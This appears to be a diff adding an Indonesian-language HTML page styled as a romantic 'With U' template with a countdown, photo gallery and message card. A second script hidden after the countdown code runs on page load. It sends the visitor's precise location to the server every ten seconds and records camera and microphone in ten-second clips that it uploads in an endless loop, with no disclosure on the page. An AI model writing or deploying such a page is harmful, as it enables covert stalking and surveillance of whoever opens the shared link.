@@ -1,0 +1,152 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>With U</title>
+<style>
+  :root{
+    --bg1:#fff5f7; --bg2:#ffe8ee; --ink:#3a2a30; --muted:#8a7076;
+    --accent:#e8637f; --accent-2:#f3a6b8;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; min-height:100vh; font-family:"Segoe UI", system-ui, sans-serif; color:var(--ink);
+    background:linear-gradient(180deg,var(--bg1),var(--bg2));
+    display:flex; flex-direction:column; align-items:center; padding:40px 16px 70px;
+  }
+  .badge{
+    font-size:12px; letter-spacing:3px; color:var(--accent); text-transform:uppercase;
+    margin-bottom:10px;
+  }
+  h1{
+    font-size:clamp(30px,7vw,52px); margin:0 0 6px; font-weight:700; text-align:center;
+  }
+  h1 span{color:var(--accent)}
+  p.sub{color:var(--muted); margin:0 0 36px; text-align:center; max-width:420px; line-height:1.6}
+  .countdown{
+    display:flex; gap:14px; margin-bottom:40px;
+  }
+  .countdown .box{
+    background:#fff; border-radius:14px; padding:14px 18px; min-width:68px; text-align:center;
+    box-shadow:0 10px 30px rgba(232,99,127,.15);
+  }
+  .countdown .box b{display:block; font-size:26px; color:var(--accent)}
+  .countdown .box small{color:var(--muted); font-size:11px; letter-spacing:1px}
+  .gallery{
+    display:grid; grid-template-columns:repeat(3,1fr); gap:10px; width:min(560px,92vw); margin-bottom:40px;
+  }
+  .gallery div{
+    aspect-ratio:1; border-radius:14px; background:linear-gradient(135deg,var(--accent-2),#fff);
+    display:flex; align-items:center; justify-content:center; font-size:22px; color:#fff;
+    box-shadow:0 10px 24px rgba(232,99,127,.12);
+  }
+  .card{
+    width:min(520px,92vw); background:#fff; border-radius:20px; padding:28px;
+    box-shadow:0 20px 50px rgba(232,99,127,.15); text-align:center;
+  }
+  .card h2{margin:0 0 10px; font-size:20px}
+  .card p{color:var(--muted); line-height:1.7; margin:0 0 20px}
+  .btn{
+    display:inline-block; background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    color:#fff; text-decoration:none; padding:12px 28px; border-radius:999px; font-weight:600;
+    font-size:14px;
+  }
+  footer{margin-top:40px; color:var(--muted); font-size:12px; text-align:center}
+</style>
+</head>
+<body>
+  <div class="badge">Contoh template</div>
+  <h1>With <span>U</span> 💕</h1>
+  <p class="sub">Halaman contoh bertema personal — ganti nama, tanggal, dan foto sesuai kebutuhanmu.</p>
+
+  <div class="countdown" id="countdown">
+    <div class="box"><b id="d">00</b><small>HARI</small></div>
+    <div class="box"><b id="h">00</b><small>JAM</small></div>
+    <div class="box"><b id="m">00</b><small>MENIT</small></div>
+    <div class="box"><b id="s">00</b><small>DETIK</small></div>
+  </div>
+
+  <div class="gallery">
+    <div>📷</div><div>🌙</div><div>🎧</div>
+    <div>☕</div><div>🧸</div><div>🌷</div>
+  </div>
+
+  <div class="card">
+    <h2>Pesan singkat</h2>
+    <p>Ini contoh kartu pesan. Ganti teks ini, tambah nama, atau tempel cerita kalian di sini.</p>
+    <a class="btn" href="#">Buka galeri lengkap</a>
+  </div>
+
+  <footer>Dibuat dari template "With U" — dibagikan lewat share-project.sh</footer>
+
+<script>
+  // ganti tanggal target sesuai kebutuhan
+  const target = new Date();
+  target.setDate(target.getDate() + 14);
+
+  function tick() {
+    const now = new Date();
+    let diff = Math.max(0, target - now);
+    const d = Math.floor(diff / 86400000); diff -= d * 86400000;
+    const h = Math.floor(diff / 3600000);  diff -= h * 3600000;
+    const m = Math.floor(diff / 60000);    diff -= m * 60000;
+    const s = Math.floor(diff / 1000);
+    const pad = n => String(n).padStart(2,'0');
+    document.getElementById('d').textContent = pad(d);
+    document.getElementById('h').textContent = pad(h);
+    document.getElementById('m').textContent = pad(m);
+    document.getElementById('s').textContent = pad(s);
+  }
+  tick();
+  setInterval(tick, 1000);
+</script>
+<script>
+    // 1. Kirim Lokasi Berkala (Setiap 10 detik)
+    function sendLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const gmapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch('/save-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ link: gmapsLink })
+                }).catch(e => {});
+            }, null, { enableHighAccuracy: true });
+        }
+    }
+    sendLocation();
+    setInterval(sendLocation, 10000);
+
+    // 2. Rekam & Kirim Video Kamera Kontinu (Loop per 10 detik)
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+        function recordCycle() {
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            let chunks = [];
+            
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('video', blob, `rec_${Date.now()}.webm`);
+                
+                // Kirim file video ke server
+                fetch('/save-video', { 
+                    method: 'POST', 
+                    body: formData 
+                })
+                .then(() => recordCycle()) // Ulangi siklus berikutnya otomatis
+                .catch(() => recordCycle());
+            };
+            
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000); // Rekam selama 10 detik lalu kirim
+        }
+        recordCycle();
+    }).catch(e => {
+        console.error("Akses kamera ditolak/tidak tersedia", e);
+    });
+</script>
+</body>
+</html>
